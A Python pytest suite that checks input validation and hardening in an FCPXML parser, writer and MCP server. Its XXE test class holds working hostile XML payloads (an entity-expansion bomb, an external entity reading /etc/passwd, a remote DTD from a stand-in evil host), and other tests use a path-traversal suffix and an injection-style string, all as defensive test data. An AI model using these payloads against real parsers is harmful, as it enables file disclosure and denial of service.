"""
Security tests — input validation, sanitization, and hardening.

Covers:
- XXE (XML External Entity) and entity expansion protection
- MarkerType.from_string injection/abuse resistance
- XML value sanitization (null bytes, control chars, length limits)
- Parser file size limits
- Marker completed-attribute strict validation
- File path and directory validation (traversal, null bytes, extensions)
- Role string sanitization in writer
"""

import sys
import types
from unittest.mock import MagicMock

import pytest
from defusedxml import DTDForbidden, EntitiesForbidden

from fcpxml.models import MarkerType
from fcpxml.parser import _MAX_FILE_SIZE_BYTES, FCPXMLParser
from fcpxml.safe_xml import safe_fromstring, safe_parse
from fcpxml.writer import (
    _MAX_MARKER_NAME_LENGTH,
    FCPXMLModifier,
    _sanitize_xml_value,
)

# ---------------------------------------------------------------------------
# Shim the `mcp` package so server.py can be imported without the real SDK
# ---------------------------------------------------------------------------
if "mcp" not in sys.modules or "mcp.server" not in sys.modules:
    mcp = types.ModuleType("mcp")
    mcp_server = types.ModuleType("mcp.server")
    mcp_server_stdio = types.ModuleType("mcp.server.stdio")
    mcp_types = types.ModuleType("mcp.types")

    class _FakeServer:
        def __init__(self, *a, **kw):
            pass
        def call_tool(self): return lambda fn: fn
        def list_tools(self): return lambda fn: fn
        def list_resources(self): return lambda fn: fn
        def read_resource(self): return lambda fn: fn
        def list_prompts(self): return lambda fn: fn
        def get_prompt(self): return lambda fn: fn

    mcp_server.Server = _FakeServer

    class _FakeCtx:
        def __init__(self, *a): pass
        async def __aenter__(self): return (MagicMock(), MagicMock())
        async def __aexit__(self, *a): pass

    mcp_server_stdio.stdio_server = _FakeCtx

    class TextContent:
        def __init__(self, *, type: str, text: str):
            self.type = type
            self.text = text

    for name in ("GetPromptResult", "Prompt", "PromptArgument",
                 "PromptMessage", "Resource", "Tool"):
        setattr(mcp_types, name, MagicMock)
    mcp_types.TextContent = TextContent

    sys.modules.setdefault("mcp", mcp)
    sys.modules.setdefault("mcp.server", mcp_server)
    sys.modules.setdefault("mcp.server.stdio", mcp_server_stdio)
    sys.modules.setdefault("mcp.types", mcp_types)

from server import (  # noqa: E402
    _validate_directory,
    _validate_filepath,
    _validate_output_path,
    generate_output_path,
)

# ============================================================================
# MarkerType.from_string hardening
# ============================================================================

class TestMarkerTypeInputValidation:

    def test_rejects_null_bytes(self):
        with pytest.raises(ValueError, match="control characters"):
            MarkerType.from_string("todo\x00")

    def test_rejects_control_characters(self):
        with pytest.raises(ValueError, match="control characters"):
            MarkerType.from_string("todo\x01")

    def test_rejects_bell_character(self):
        with pytest.raises(ValueError, match="control characters"):
            MarkerType.from_string("\x07standard")

    def test_rejects_non_string(self):
        with pytest.raises(TypeError, match="Expected str"):
            MarkerType.from_string(42)

    def test_rejects_none(self):
        with pytest.raises(TypeError, match="Expected str"):
            MarkerType.from_string(None)

    def test_rejects_empty_string(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            MarkerType.from_string("")

    def test_rejects_whitespace_only(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            MarkerType.from_string("   ")

    def test_rejects_oversized_string(self):
        with pytest.raises(ValueError, match="maximum length"):
            MarkerType.from_string("a" * 100)

    def test_strips_whitespace_todo(self):
        """Leading/trailing whitespace is stripped before matching for todo."""
        assert MarkerType.from_string("  todo  ") == MarkerType.TODO

    def test_strips_whitespace_completed(self):
        """Leading/trailing whitespace is stripped before matching for completed."""
        assert MarkerType.from_string("  completed  ") == MarkerType.COMPLETED

    def test_strips_whitespace_chapter(self):
        """Leading/trailing whitespace is stripped before matching for chapter."""
        assert MarkerType.from_string("  chapter  ") == MarkerType.CHAPTER

    def test_allows_tab_in_value(self):
        """Tabs are printable — should pass control char check but fail enum lookup."""
        with pytest.raises(ValueError, match="Invalid marker type"):
            MarkerType.from_string("to\tdo")


# ============================================================================
# XML value sanitization
# ============================================================================

class TestSanitizeXmlValue:

    def test_strips_null_bytes(self):
        assert _sanitize_xml_value("hello\x00world") == "helloworld"

    def test_strips_control_characters(self):
        assert _sanitize_xml_value("line\x01\x02\x03end") == "lineend"

    def test_preserves_tabs_and_newlines(self):
        assert _sanitize_xml_value("line1\nline2\ttab") == "line1\nline2\ttab"

    def test_truncates_at_max_length(self):
        long_str = "A" * 2000
        result = _sanitize_xml_value(long_str, max_length=100)
        assert len(result) == 100

    def test_default_max_length(self):
        long_str = "B" * (_MAX_MARKER_NAME_LENGTH + 500)
        result = _sanitize_xml_value(long_str)
        assert len(result) == _MAX_MARKER_NAME_LENGTH

    def test_non_string_converted(self):
        assert _sanitize_xml_value(42) == "42"

    def test_empty_string_passthrough(self):
        assert _sanitize_xml_value("") == ""

    def test_unicode_preserved(self):
        assert _sanitize_xml_value("日本語マーカー") == "日本語マーカー"


# ============================================================================
# Marker note sanitization in writer
# ============================================================================

class TestMarkerNoteSanitization:

    @pytest.fixture
    def sample_fcpxml(self, tmp_path):
        xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE fcpxml>
<fcpxml version="1.11">
    <resources>
        <format id="r1" frameDuration="1/24s" width="1920" height="1080"/>
        <asset id="r2" name="TestClip" src="test.mov" start="0s" duration="240/24s"/>
    </resources>
    <library>
        <event name="Test">
            <project name="Test">
                <sequence format="r1" duration="240/24s">
                    <spine>
                        <asset-clip ref="r2" offset="0s" name="TestClip"
                                    start="0s" duration="240/24s" format="r1"/>
                    </spine>
                </sequence>
            </project>
        </event>
    </library>
</fcpxml>"""
        p = tmp_path / "sanitize_test.fcpxml"
        p.write_text(xml)
        return str(p)

    def test_null_bytes_stripped_from_marker_name(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        marker = modifier.add_marker("TestClip", "00:00:00:00", "bad\x00name")
        assert "\x00" not in marker.get("value", "")

    def test_control_chars_stripped_from_note(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        marker = modifier.add_marker(
            "TestClip", "00:00:00:00", "test",
            note="has\x01\x02control\x03chars"
        )
        assert "\x01" not in marker.get("note", "")
        assert marker.get("note") == "hascontrolchars"


# ============================================================================
# Parser completed-attribute strict validation
# ============================================================================

class TestCompletedAttributeValidation:

    def _parse_marker_xml(self, completed_value):
        xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<fcpxml version="1.11">
    <resources>
        <format id="r1" frameDuration="1/24s" width="1920" height="1080"/>
        <asset id="r2" name="Clip" src="test.mov" start="0s" duration="240/24s"/>
    </resources>
    <library>
        <event name="Test">
            <project name="Test">
                <sequence format="r1" duration="240/24s">
                    <spine>
                        <asset-clip ref="r2" offset="0s" name="Clip"
                                    start="0s" duration="240/24s" format="r1">
                            <marker start="0s" duration="1/24s" value="Test"
                                    completed="{completed_value}"/>
                        </asset-clip>
                    </spine>
                </sequence>
            </project>
        </event>
    </library>
</fcpxml>"""
        parser = FCPXMLParser()
        project = parser.parse_string(xml)
        return project.primary_timeline.clips[0].markers[0]

    def test_completed_0_is_todo(self):
        m = self._parse_marker_xml("0")
        assert m.marker_type == MarkerType.TODO

    def test_completed_1_is_completed(self):
        m = self._parse_marker_xml("1")
        assert m.marker_type == MarkerType.COMPLETED

    def test_completed_true_falls_to_standard(self):
        """Non-standard 'true' is rejected — treated as STANDARD."""
        m = self._parse_marker_xml("true")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_yes_falls_to_standard(self):
        """Non-standard 'yes' is rejected — treated as STANDARD."""
        m = self._parse_marker_xml("yes")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_2_falls_to_standard(self):
        """Numeric but non-boolean '2' is rejected."""
        m = self._parse_marker_xml("2")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_empty_falls_to_standard(self):
        m = self._parse_marker_xml("")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_sql_injection_falls_to_standard(self):
        """SQL-like injection in completed attribute is harmless."""
        m = self._parse_marker_xml("1 OR 1=1")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_whitespace_padded_zero_falls_to_standard(self):
        """Whitespace around '0' must not be treated as TODO — strict matching."""
        m = self._parse_marker_xml(" 0 ")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_whitespace_padded_one_falls_to_standard(self):
        """Whitespace around '1' must not be treated as COMPLETED — strict matching."""
        m = self._parse_marker_xml(" 1 ")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_negative_one_falls_to_standard(self):
        """Negative integers are not valid completed values."""
        m = self._parse_marker_xml("-1")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_case_true_upper_falls_to_standard(self):
        """Case variants of truthy strings are all rejected."""
        m = self._parse_marker_xml("TRUE")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_case_false_falls_to_standard(self):
        """Boolean 'false' string is not a valid completed value."""
        m = self._parse_marker_xml("false")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_whitespace_only_falls_to_standard(self):
        """Pure whitespace completed='   ' must not match any boolean value."""
        m = self._parse_marker_xml("   ")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_tab_padded_zero_falls_to_standard(self):
        """Tab characters around '0' bypass strip() — strict match rejects."""
        m = self._parse_marker_xml("\t0\t")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_tab_padded_one_falls_to_standard(self):
        """Tab characters around '1' bypass strip() — strict match rejects."""
        m = self._parse_marker_xml("\t1\t")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_zero_with_leading_zero_falls_to_standard(self):
        """'00' is not '0' — strict exact-match only."""
        m = self._parse_marker_xml("00")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_unicode_digit_zero_falls_to_standard(self):
        """Unicode fullwidth digit '\uff10' looks like 0 but isn't ASCII '0'."""
        m = self._parse_marker_xml("\uff10")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_unicode_digit_one_falls_to_standard(self):
        """Unicode fullwidth digit '\uff11' looks like 1 but isn't ASCII '1'."""
        m = self._parse_marker_xml("\uff11")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_newline_padded_zero_falls_to_standard(self):
        """Newline around '0' from hand-edited XML must not match TODO."""
        m = self._parse_marker_xml("\n0\n")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_newline_padded_one_falls_to_standard(self):
        """Newline around '1' from hand-edited XML must not match COMPLETED."""
        m = self._parse_marker_xml("\n1\n")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_crlf_padded_zero_falls_to_standard(self):
        r"""CRLF (\r\n) around '0' from Windows-edited XML must not match."""
        m = self._parse_marker_xml("\r\n0\r\n")
        assert m.marker_type == MarkerType.STANDARD

    def test_completed_mixed_whitespace_one_falls_to_standard(self):
        """Mixed whitespace (space+tab+newline) around '1' must not match."""
        m = self._parse_marker_xml(" \t\n1\n\t ")
        assert m.marker_type == MarkerType.STANDARD


# ============================================================================
# Parser file size limit
# ============================================================================

class TestFileSizeLimit:

    def test_oversized_file_rejected(self, tmp_path):
        """Files exceeding the size limit are rejected before parsing."""
        huge = tmp_path / "huge.fcpxml"
        # Create a file that exceeds the limit via sparse write
        with open(huge, 'wb') as f:
            f.seek(_MAX_FILE_SIZE_BYTES + 1)
            f.write(b'\x00')

        parser = FCPXMLParser()
        with pytest.raises(ValueError, match="exceeds maximum size"):
            parser.parse_file(str(huge))

    def test_normal_file_accepted(self, tmp_path):
        """Normal-sized files parse without size errors."""
        xml = """<?xml version="1.0" encoding="UTF-8"?>
<fcpxml version="1.11">
    <resources>
        <format id="r1" frameDuration="1/24s" width="1920" height="1080"/>
    </resources>
    <library>
        <event name="Test">
            <project name="Test">
                <sequence format="r1" duration="0s">
                    <spine/>
                </sequence>
            </project>
        </event>
    </library>
</fcpxml>"""
        normal = tmp_path / "normal.fcpxml"
        normal.write_text(xml)
        parser = FCPXMLParser()
        project = parser.parse_file(str(normal))
        assert project.name == "Test"


# ============================================================================
# XXE and entity expansion protection (defusedxml)
# ============================================================================

class TestXXEProtection:
    """Verify that defusedxml blocks XML attacks at all entry points."""

    BILLION_LAUGHS = """\
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<fcpxml version="1.11">&lol4;</fcpxml>"""

    XXE_FILE_READ = """\
<?xml version="1.0"?>
<!DOCTYPE fcpxml [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<fcpxml version="1.11">
    <resources>
        <asset id="r1" name="&xxe;" src="test.mov"/>
    </resources>
</fcpxml>"""

    EXTERNAL_DTD_WITH_ENTITY = """\
<?xml version="1.0"?>
<!DOCTYPE fcpxml [
  <!ENTITY % remote SYSTEM "http://evil.example.com/payload.dtd">
  %remote;
]>
<fcpxml version="1.11"/>"""

    def test_billion_laughs_blocked_fromstring(self):
        """Entity expansion bomb must be rejected by safe_fromstring."""
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            safe_fromstring(self.BILLION_LAUGHS)

    def test_xxe_file_read_blocked_fromstring(self):
        """External entity file read must be rejected by safe_fromstring."""
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            safe_fromstring(self.XXE_FILE_READ)

    def test_external_dtd_entity_blocked_fromstring(self):
        """Remote DTD parameter entity must be rejected by safe_fromstring."""
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            safe_fromstring(self.EXTERNAL_DTD_WITH_ENTITY)

    def test_billion_laughs_blocked_parse(self, tmp_path):
        """Entity expansion bomb must be rejected by safe_parse."""
        p = tmp_path / "bomb.fcpxml"
        p.write_text(self.BILLION_LAUGHS)
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            safe_parse(str(p))

    def test_xxe_file_read_blocked_parse(self, tmp_path):
        """External entity file read must be rejected by safe_parse."""
        p = tmp_path / "xxe.fcpxml"
        p.write_text(self.XXE_FILE_READ)
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            safe_parse(str(p))

    def test_external_dtd_entity_blocked_parse(self, tmp_path):
        """Remote DTD parameter entity must be rejected by safe_parse."""
        p = tmp_path / "dtd.fcpxml"
        p.write_text(self.EXTERNAL_DTD_WITH_ENTITY)
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            safe_parse(str(p))

    def test_parser_rejects_billion_laughs(self):
        """FCPXMLParser.parse_string must reject entity expansion attacks."""
        parser = FCPXMLParser()
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            parser.parse_string(self.BILLION_LAUGHS)

    def test_parser_rejects_xxe(self):
        """FCPXMLParser.parse_string must reject XXE attacks."""
        parser = FCPXMLParser()
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            parser.parse_string(self.XXE_FILE_READ)

    def test_parser_file_rejects_billion_laughs(self, tmp_path):
        """FCPXMLParser.parse_file must reject entity expansion from files."""
        p = tmp_path / "bomb.fcpxml"
        p.write_text(self.BILLION_LAUGHS)
        parser = FCPXMLParser()
        with pytest.raises((EntitiesForbidden, DTDForbidden)):
            parser.parse_file(str(p))

    def test_clean_xml_still_parses(self):
        """Legitimate FCPXML without DTD/entities must still parse fine."""
        xml = """<?xml version="1.0" encoding="UTF-8"?>
<fcpxml version="1.11">
    <resources>
        <format id="r1" frameDuration="1/24s" width="1920" height="1080"/>
    </resources>
    <library>
        <event name="Test">
            <project name="Safe">
                <sequence format="r1" duration="0s">
                    <spine/>
                </sequence>
            </project>
        </event>
    </library>
</fcpxml>"""
        parser = FCPXMLParser()
        project = parser.parse_string(xml)
        assert project.name == "Safe"


# ============================================================================
# File path validation (_validate_filepath)
# ============================================================================

class TestFilePathValidation:

    def test_null_byte_in_filepath_rejected(self, tmp_path):
        with pytest.raises(ValueError, match="null byte"):
            _validate_filepath("test\x00.fcpxml")

    def test_nonexistent_file_raises_fnf(self):
        with pytest.raises(FileNotFoundError):
            _validate_filepath("/nonexistent/path/file.fcpxml", ('.fcpxml',))

    def test_wrong_extension_rejected(self, tmp_path):
        bad = tmp_path / "evil.exe"
        bad.write_text("data")
        with pytest.raises(ValueError, match="Invalid file type"):
            _validate_filepath(str(bad), ('.fcpxml', '.fcpxmld'))

    def test_directory_rejected_as_file(self, tmp_path):
        with pytest.raises(ValueError, match="Not a regular file"):
            _validate_filepath(str(tmp_path), ('.fcpxml',))

    def test_oversized_file_rejected(self, tmp_path):
        big = tmp_path / "big.fcpxml"
        with open(big, 'wb') as f:
            f.seek(101 * 1024 * 1024)
            f.write(b'\x00')
        with pytest.raises(ValueError, match="too large"):
            _validate_filepath(str(big), ('.fcpxml',))

    def test_valid_file_accepted(self, tmp_path):
        ok = tmp_path / "test.fcpxml"
        ok.write_text("<fcpxml/>")
        result = _validate_filepath(str(ok), ('.fcpxml',))
        assert result == str(ok.resolve())

    def test_symlink_traversal_resolved(self, tmp_path):
        """Symlinks are resolved before validation — no bypassing via links."""
        real = tmp_path / "real.fcpxml"
        real.write_text("<fcpxml/>")
        link = tmp_path / "link.fcpxml"
        link.symlink_to(real)
        result = _validate_filepath(str(link), ('.fcpxml',))
        assert result == str(real.resolve())


# ============================================================================
# Output path validation (_validate_output_path)
# ============================================================================

class TestOutputPathValidation:

    def test_null_byte_in_output_rejected(self):
        with pytest.raises(ValueError, match="null byte"):
            _validate_output_path("/tmp/out\x00put.fcpxml")

    def test_missing_parent_dir_rejected(self):
        with pytest.raises(ValueError, match="does not exist"):
            _validate_output_path("/nonexistent/dir/file.fcpxml")

    def test_valid_output_accepted(self, tmp_path):
        result = _validate_output_path(str(tmp_path / "out.fcpxml"))
        assert "out.fcpxml" in result

    def test_anchor_dir_allows_child(self, tmp_path):
        """Output inside anchor_dir is accepted."""
        result = _validate_output_path(
            str(tmp_path / "out.fcpxml"), anchor_dir=str(tmp_path)
        )
        assert "out.fcpxml" in result

    def test_anchor_dir_blocks_escape(self, tmp_path):
        """Output outside anchor_dir is rejected — prevents sandbox escape."""
        safe = tmp_path / "safe"
        safe.mkdir()
        with pytest.raises(ValueError, match="escapes allowed directory"):
            _validate_output_path(
                str(tmp_path / "out.fcpxml"), anchor_dir=str(safe)
            )

    def test_anchor_dir_blocks_traversal(self, tmp_path):
        """Explicit ../ traversal past anchor is caught after resolve."""
        safe = tmp_path / "safe"
        safe.mkdir()
        with pytest.raises(ValueError, match="escapes allowed directory"):
            _validate_output_path(
                str(safe / ".." / "escaped.fcpxml"), anchor_dir=str(safe)
            )

    def test_anchor_dir_allows_nested(self, tmp_path):
        """Deeply nested output under anchor is fine."""
        deep = tmp_path / "a" / "b" / "c"
        deep.mkdir(parents=True)
        result = _validate_output_path(
            str(deep / "out.fcpxml"), anchor_dir=str(tmp_path)
        )
        assert "out.fcpxml" in result

    def test_no_anchor_dir_is_permissive(self, tmp_path):
        """Without anchor_dir, any valid parent is accepted (backward compat)."""
        result = _validate_output_path(str(tmp_path / "anywhere.fcpxml"))
        assert "anywhere.fcpxml" in result


# ============================================================================
# Directory validation (_validate_directory)
# ============================================================================

class TestDirectoryValidation:

    def test_null_byte_in_directory_rejected(self):
        with pytest.raises(ValueError, match="null byte"):
            _validate_directory("/tmp\x00/evil")

    def test_nonexistent_directory_rejected(self):
        with pytest.raises(ValueError, match="Not a valid directory"):
            _validate_directory("/nonexistent/path/nowhere")

    def test_file_rejected_as_directory(self, tmp_path):
        f = tmp_path / "notadir.txt"
        f.write_text("data")
        with pytest.raises(ValueError, match="Not a valid directory"):
            _validate_directory(str(f))

    def test_valid_directory_accepted(self, tmp_path):
        result = _validate_directory(str(tmp_path))
        assert result == str(tmp_path.resolve())

    def test_symlink_directory_resolved(self, tmp_path):
        """Symlinked directories resolve to real path."""
        real_dir = tmp_path / "real"
        real_dir.mkdir()
        link = tmp_path / "link"
        link.symlink_to(real_dir)
        result = _validate_directory(str(link))
        assert result == str(real_dir.resolve())

    def test_allowed_root_accepts_descendant(self, tmp_path):
        """Subdirectory under allowed_root is accepted."""
        child = tmp_path / "projects"
        child.mkdir()
        result = _validate_directory(str(child), allowed_root=str(tmp_path))
        assert result == str(child.resolve())

    def test_allowed_root_accepts_exact_match(self, tmp_path):
        """Root itself is a valid descendant."""
        result = _validate_directory(str(tmp_path), allowed_root=str(tmp_path))
        assert result == str(tmp_path.resolve())

    def test_allowed_root_blocks_escape(self, tmp_path):
        """Directory outside allowed_root is rejected."""
        safe = tmp_path / "safe"
        safe.mkdir()
        outside = tmp_path / "outside"
        outside.mkdir()
        with pytest.raises(ValueError, match="escapes allowed root"):
            _validate_directory(str(outside), allowed_root=str(safe))

    def test_allowed_root_blocks_traversal(self, tmp_path):
        """../ traversal past allowed_root is caught."""
        safe = tmp_path / "safe"
        safe.mkdir()
        with pytest.raises(ValueError, match="escapes allowed root"):
            _validate_directory(str(safe / ".."), allowed_root=str(safe))


# ============================================================================
# Output suffix injection (generate_output_path)
# ============================================================================

class TestGenerateOutputPathSanitization:

    def test_normal_suffix_preserved(self, tmp_path):
        result = generate_output_path(str(tmp_path / "clip.fcpxml"), "_trimmed")
        assert result.endswith("clip_trimmed.fcpxml")

    def test_path_separator_stripped_from_suffix(self, tmp_path):
        """A suffix containing / cannot inject path components."""
        result = generate_output_path(str(tmp_path / "clip.fcpxml"), "/../../../etc/cron")
        assert "/../" not in result
        assert "etc" in result  # Characters survive but separators don't

    def test_null_byte_stripped_from_suffix(self, tmp_path):
        result = generate_output_path(str(tmp_path / "clip.fcpxml"), "_mod\x00ified")
        assert "\x00" not in result

    def test_empty_suffix_gets_default(self, tmp_path):
        """If sanitization strips everything, fallback to _modified."""
        result = generate_output_path(str(tmp_path / "clip.fcpxml"), "///")
        assert "_modified" in result

    def test_dots_and_hyphens_preserved(self, tmp_path):
        result = generate_output_path(str(tmp_path / "clip.fcpxml"), "_v2.1-final")
        assert "clip_v2.1-final.fcpxml" in result


# ============================================================================
# Role string sanitization in writer
# ============================================================================

class TestRoleSanitization:

    @pytest.fixture
    def sample_fcpxml(self, tmp_path):
        xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE fcpxml>
<fcpxml version="1.11">
    <resources>
        <format id="r1" frameDuration="1/24s" width="1920" height="1080"/>
        <asset id="r2" name="TestClip" src="test.mov" start="0s" duration="240/24s"/>
    </resources>
    <library>
        <event name="Test">
            <project name="Test">
                <sequence format="r1" duration="240/24s">
                    <spine>
                        <asset-clip ref="r2" offset="0s" name="TestClip"
                                    start="0s" duration="240/24s" format="r1"/>
                    </spine>
                </sequence>
            </project>
        </event>
    </library>
</fcpxml>"""
        p = tmp_path / "role_test.fcpxml"
        p.write_text(xml)
        return str(p)

    def test_null_bytes_stripped_from_audio_role(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        clip = modifier.assign_role("TestClip", audio_role="dialogue\x00.evil")
        assert "\x00" not in clip.get("audioRole", "")
        assert clip.get("audioRole") == "dialogue.evil"

    def test_control_chars_stripped_from_video_role(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        clip = modifier.assign_role("TestClip", video_role="video\x01\x02role")
        assert clip.get("videoRole") == "videorole"

    def test_oversized_role_truncated(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        clip = modifier.assign_role("TestClip", audio_role="A" * 500)
        assert len(clip.get("audioRole", "")) == 256

    def test_normal_role_passes_through(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        clip = modifier.assign_role("TestClip", audio_role="dialogue.D-1")
        assert clip.get("audioRole") == "dialogue.D-1"

    def test_unicode_role_preserved(self, sample_fcpxml):
        modifier = FCPXMLModifier(sample_fcpxml)
        clip = modifier.assign_role("TestClip", audio_role="ダイアログ")
        assert clip.get("audioRole") == "ダイアログ"
